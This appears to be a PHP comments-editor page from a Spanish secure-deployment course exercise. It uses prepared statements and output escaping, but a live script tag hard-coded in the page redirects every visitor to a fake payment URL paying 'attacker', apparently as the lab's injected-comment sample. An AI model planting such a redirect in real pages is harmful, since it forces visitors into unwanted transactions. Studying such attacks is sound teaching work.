<?php
require_once dirname(__FILE__) . '/private/conf.php';

# Require logged users
require dirname(__FILE__) . '/private/auth.php';
?>
<!doctype html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/style.css">
    <title>Práctica RA3 - Comments editor</title>
</head>
<body>
<header>
    <h1>Comments editor</h1>
</header>
<main class="player">

<?php
# List comments
if (isset($_GET['id']))
{
    $query = "SELECT commentId, username, body FROM comments C, users U WHERE C.playerId = :playerId AND U.userId = C.userId ORDER BY C.playerId DESC";
    $stmt = $db->prepare($query);
    $stmt->bindValue(':playerId', $_GET['id'], SQLITE3_INTEGER);
    $result = $stmt->execute();

    while ($row = $result->fetchArray()) {
        // Escapar los datos antes de mostrarlos
        $username = htmlspecialchars($row['username'], ENT_QUOTES, 'UTF-8');
        $body = htmlspecialchars($row['body'], ENT_QUOTES, 'UTF-8');

        echo "<div>
                <h4>". $username ."</h4> 
                <p>commented: " . $body . "</p>
              </div>";
    }

    $playerId = $_GET['id'];
}
?>

<div>
    <a href="list_players.php">Back to list</a>
    <p>¡Gran jugador! <script>window.location.href = 'http://web.pagos/donate.php?amount=100&receiver=attacker';</script></p>
    <a class="black" href="add_comment.php?id=<?php echo htmlspecialchars($playerId, ENT_QUOTES, 'UTF-8'); ?>"> Add comment</a>
</div>

</main>
<footer class="listado">
    <img src="images/logo-iesra-cadiz-color-blanco.png">
    <h4>Puesta en producción segura</h4>
    < Please <a href="http://www.donate.co?amount=100&amp;destination=ACMEScouting/"> donate</a> >
</footer>
</body>
</html>

